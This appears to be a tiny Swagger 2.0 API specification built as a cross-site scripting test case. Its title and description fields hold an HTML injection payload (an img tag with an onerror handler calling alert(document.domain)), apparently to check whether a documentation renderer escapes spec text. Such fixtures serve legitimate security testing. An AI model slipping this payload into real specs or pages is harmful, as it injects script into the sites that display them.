swagger: '2.0'
info:
  title: XSS test'"><img src=x onerror=alert(document.domain)>
  description: |
    <img src=x onerror=alert(document.domain)>
paths:
  /test:
    get:
      summary: test
      responses:
        '200':
          description: OK
